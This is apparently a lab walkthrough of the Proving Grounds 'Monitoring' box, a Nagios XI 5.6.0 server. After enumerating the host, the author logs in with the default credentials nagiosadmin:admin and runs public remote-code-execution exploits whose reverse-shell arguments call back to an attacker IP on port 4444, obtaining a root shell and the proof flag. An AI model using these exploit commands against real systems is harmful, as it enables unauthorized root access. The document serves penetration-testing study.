# Monitoring

## Initial access

Run `autorecon` to enumerate the target:

```
sudo autorecon 192.168.239.136
```

Open ports discovered:

- **22** — SSH (OpenSSH 7.2p2 Ubuntu 4ubuntu2.10, Linux; protocol 2.0)
  - Running `nmap -p 22 --script=/usr/share/nmap/scripts/ssh-brute.nse 192.168.239.136` returned no results
- **25** — SMTP (Postfix smtpd)
  - Found users `root` and `mysql`
- **80** — HTTP (Apache httpd 2.4.18, Ubuntu)
  - Additional webpages:
    - `http://192.168.239.136/nagios`
    - `http://192.168.239.136/nagiosxi/images/`
    - `http://192.168.239.136/nagiosxi/includes/`
    - `http://192.168.239.136/nagiosxi/login.php`
- **389** — LDAP (OpenLDAP 2.2.X - 2.3.X)
  - Nothing interesting found
- **443** — HTTPS (Apache httpd 2.4.18)
  - Seems to have the same webpages as port 80
- **5667** — tcpwrapped

Visiting the root path (`http://192.168.239.136/`) revealed a button linking to `http://192.168.239.136/nagiosxi`, which redirected to `http://192.168.239.136/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1`.

The `/nagios` path required login. Directory busting on `/nagios/` returned nothing of interest.

Directory busting on `http://192.168.239.136/nagiosxi/` revealed several subdirectories:

```
301      GET        9l       28w      321c http://192.168.239.136/nagiosxi => http://192.168.239.136/nagiosxi/
301      GET        9l       28w      326c http://192.168.239.136/nagiosxi/help => http://192.168.239.136/nagiosxi/help/
301      GET        9l       28w      328c http://192.168.239.136/nagiosxi/images => http://192.168.239.136/nagiosxi/images/
301      GET        9l       28w      327c http://192.168.239.136/nagiosxi/tools => http://192.168.239.136/nagiosxi/tools/
301      GET        9l       28w      327c http://192.168.239.136/nagiosxi/admin => http://192.168.239.136/nagiosxi/admin/
301      GET        9l       28w      329c http://192.168.239.136/nagiosxi/reports => http://192.168.239.136/nagiosxi/reports/
301      GET        9l       28w      329c http://192.168.239.136/nagiosxi/account => http://192.168.239.136/nagiosxi/account/
301      GET        9l       28w      329c http://192.168.239.136/nagiosxi/backend => http://192.168.239.136/nagiosxi/backend/
301      GET        9l       28w      324c http://192.168.239.136/nagiosxi/db => http://192.168.239.136/nagiosxi/db/
301      GET        9l       28w      325c http://192.168.239.136/nagiosxi/api => http://192.168.239.136/nagiosxi/api/
301      GET        9l       28w      330c http://192.168.239.136/nagiosxi/includes => http://192.168.239.136/nagiosxi/includes/
301      GET        9l       28w      328c http://192.168.239.136/nagiosxi/config => http://192.168.239.136/nagiosxi/config/
301      GET        9l       28w      334c http://192.168.239.136/nagiosxi/includes/css => http://192.168.239.136/nagiosxi/includes/css/
301      GET        9l       28w      341c http://192.168.239.136/nagiosxi/includes/components => http://192.168.239.136/nagiosxi/includes/components/
301      GET        9l       28w      345c http://192.168.239.136/nagiosxi/includes/components/map => http://192.168.239.136/nagiosxi/includes/components/map/
301      GET        9l       28w      333c http://192.168.239.136/nagiosxi/includes/js => http://192.168.239.136/nagiosxi/includes/js/
301      GET        9l       28w      353c http://192.168.239.136/nagiosxi/includes/components/map/scripts => http://192.168.239.136/nagiosxi/includes/components/map/scripts/
301      GET        9l       28w      347c http://192.168.239.136/nagiosxi/includes/components/proxy => http://192.168.239.136/nagiosxi/includes/components/proxy/
301      GET        9l       28w      335c http://192.168.239.136/nagiosxi/includes/lang => http://192.168.239.136/nagiosxi/includes/lang/
301      GET        9l       28w      353c http://192.168.239.136/nagiosxi/includes/components/map/library => http://192.168.239.136/nagiosxi/includes/components/map/library/
301      GET        9l       28w      335c http://192.168.239.136/nagiosxi/images/social => http://192.168.239.136/nagiosxi/images/social/
301      GET        9l       28w      350c http://192.168.239.136/nagiosxi/includes/components/response => http://192.168.239.136/nagiosxi/includes/components/response/
301      GET        9l       28w      336c http://192.168.239.136/nagiosxi/includes/js/d3 => http://192.168.239.136/nagiosxi/includes/js/d3/
```

Logging into `http://192.168.239.136/nagiosxi/login.php` returned `NSP: Sorry Dave, I can't let you do that`. This is a session-protection or CSRF (Cross-Site Request Forgery) security block. The NSP is a token embedded in the webpage source code as `var nsp_str = "08af73fd52d7a601e999045463bc529142dae1fbdc87c8bb8b379a7ee69c28b9";`. The value must be sent as a POST parameter when logging in, and it randomizes on each page refresh.

Logging into `https://192.168.239.136/nagiosxi/login.php` returned `Invalid username or password.` without the NSP issue. Searched online for default login credentials and successfully logged in with `nagiosadmin:admin`. The dashboard showed Nagios XI version 5.6.0.

Checked vulnerabilities for Nagios XI 5.6.0 using `searchsploit` with no results. Expanded the search scope:

```
searchsploit nagios xi | grep -i remote      
Nagios XI - 'login.php' Multiple Cross-Site Scripting Vulnerabilities                                                                                                                                     | linux/remote/34507.txt
Nagios XI - 'tfPassword' SQL Injection                                                                                                                                                                    | php/remote/38827.txt
Nagios XI - 'users.php' SQL Injection                                                                                                                                                                     | multiple/remote/34523.txt
Nagios XI - Authenticated Remote Command Execution (Metasploit)                                                                                                                                           | linux/remote/48191.rb
Nagios XI - Multiple Cross-Site Request Forgery Vulnerabilities                                                                                                                                           | linux/remote/34431.html
Nagios XI - Multiple Cross-Site Scripting / HTML Injection Vulnerabilities                                                                                                                                | multiple/remote/36455.txt
Nagios XI 5.2.6 < 5.2.9 / 5.3 / 5.4 - Chained Remote Root                                                                                                                                                 | php/webapps/44560.py
Nagios XI 5.2.6-5.4.12 - Chained Remote Code Execution (Metasploit)                                                                                                                                       | linux/remote/44969.rb
Nagios XI 5.5.6 - Magpie_debug.php Root Remote Code Execution (Metasploit)                                                                                                                                | linux/remote/47039.rb
Nagios XI 5.5.6 - Remote Code Execution / Privilege Escalation                                                                                                                                            | linux/webapps/46221.py
Nagios XI 5.6.12 - 'export-rrd.php' Remote Code Execution                                                                                                                                                 | php/webapps/48640.txt
Nagios XI 5.6.5 - Remote Code Execution / Root Privilege Escalation                                                                                                                                       | php/webapps/47299.php
Nagios Xi 5.6.6 - Authenticated Remote Code Execution (RCE)                                                                                                                                               | multiple/webapps/52138.txt
Nagios XI 5.7.3 - 'mibs.php' Remote Command Injection (Authenticated)                                                                                                                                     | php/webapps/48959.py
Nagios XI 5.7.X - Remote Code Execution RCE (Authenticated)                                                                                                                                               | php/webapps/49422.py
Nagios XI Chained - Remote Code Execution (Metasploit)                                                                                                                                                    | linux/remote/40067.rb
Nagios XI Network Monitor Graph Explorer Component - Command Injection (Metasploit)                                                                                                                       | unix/remote/23227.rb
```

Installed required PHP modules for exploit 47299:

```
sudo apt install php-curl
sudo apt install php-xml
```

Ran the exploit against the target:

```
php 47299.php --host=192.168.239.136 --ssl=false --user=nagiosadmin --pass=admin --reverseip=192.168.45.198 --reverseport=4444

root@lab-pg-ubuntu16-monitoring-244-189:/usr/local/nagiosxi/html/includes/components/profile# whoami
root
```

No privilege escalation was needed as the exploit already provided a root shell.

Retrieved the proof flag:

```
root@lab-pg-ubuntu16-monitoring-244-189:/usr/local/nagiosxi/html/includes/components/profile# cd /root
root@lab-pg-ubuntu16-monitoring-244-189:~# cat proof.txt
2d7f46c8a65952e766c8c3928305c969
```

### Alternative Initial Access — Exploit 49422.py (EDB)

Exploit 49422 targets Nagios XI 5.7.X via the `monitoringplugins.php` file upload endpoint. It uploads a base64-encoded reverse shell payload and triggers execution through the same `profile.php?cmd=download` mechanism.

```
python3 49422.py http://192.168.239.136 nagiosadmin admin 192.168.45.198 4444
```

Credit: [cyber_public_school — Monitoring Walkthrough (Proving Ground Play OSCP)](https://medium.com/@cyber_public_school/monitoring-walkthrough-proving-ground-play-oscp-6c8d637d649e)

### Alternative Initial Access — hadrian3689/nagiosxi_5.6.6 exploit.py (CVE-2019-15949)

The hadrian3689/nagiosxi_5.6.6 exploit.py (CVE-2019-15949) targets Nagios XI 5.6.6 via the `monitoringplugins.php` file upload endpoint. It uploads a malicious plugin and triggers execution through the `profile.php?cmd=download` mechanism, achieving authenticated remote command execution as root.

```
python3 exploit.py -t 'http://192.168.239.136/' -b /nagiosxi/ -u nagiosadmin -p admin -lh 192.168.45.198 -lp 4444
```

Credit: [CyberArri — Monitoring PG Play Writeup](https://cyberarri.com/2024/06/09/monitoring-pg-play-writeup)
